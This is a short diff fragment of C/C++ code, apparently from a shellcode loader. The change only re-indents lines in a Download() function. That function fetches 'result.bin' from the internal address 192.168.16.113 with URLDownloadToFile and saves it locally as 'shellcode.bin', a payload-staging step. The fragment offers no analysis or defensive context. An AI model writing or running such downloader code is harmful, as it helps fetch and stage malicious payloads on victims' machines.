@@ -12,8 +12,8 @@ extern "C" {
 #endif
 
     int Download() {
-		const wchar_t* srcURL;
-		srcURL = L"http://192.168.16.113/result.bin"; 
+	const wchar_t* srcURL;
+	srcURL = L"http://192.168.16.113/result.bin"; 
         const wchar_t* destFile = L"shellcode.bin";
         if (S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL)) {
             //printf("Saved to 'shellcode.bin' \n");
